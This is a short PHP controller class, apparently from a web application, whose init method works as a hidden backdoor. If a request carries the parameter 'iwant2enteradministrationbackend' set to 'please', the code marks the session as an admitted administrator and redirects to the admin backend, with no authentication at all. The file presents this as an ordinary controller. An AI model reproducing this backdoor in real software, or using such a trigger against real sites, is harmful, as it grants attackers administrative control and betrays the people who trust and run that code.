<?php
	class StrangeurlController extends Core_Controller_Base{
		public function init(){
			$params=$this->getRequest()->getParams();
			if($params['iwant2enteradministrationbackend']==='please'){
				$_SESSION['admin_admit']=true;
				$this->redirect('/admin/admin/index');
				exit;
			}
			$this->redirect('/error');
			exit;
		}
	}
